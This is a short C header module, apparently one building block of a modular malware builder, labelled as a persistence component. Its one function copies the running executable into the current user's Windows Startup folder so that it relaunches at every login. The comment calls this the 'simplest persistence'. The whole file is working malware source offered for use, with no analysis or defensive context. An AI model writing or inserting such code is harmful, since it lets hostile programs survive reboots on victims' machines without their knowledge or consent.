// chunk: persist/startup_folder
// depends: (none)
// provides: persist_startup_folder
// headers: windows.h,shlobj.h
// note: Copy self to user's Startup folder — simplest persistence

#ifndef CHUNK_PERSIST_STARTUP
#define CHUNK_PERSIST_STARTUP

#include <windows.h>
#include <shlobj.h>

static int persist_startup_folder(const char *filename) {
    char startup[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup) != S_OK)
        return 0;

    char src[MAX_PATH], dst[MAX_PATH];
    GetModuleFileNameA(NULL, src, MAX_PATH);
    snprintf(dst, MAX_PATH, "%s\\%s", startup, filename);

    if (GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES)
        return 1;

    return CopyFileA(src, dst, FALSE);
}

#endif
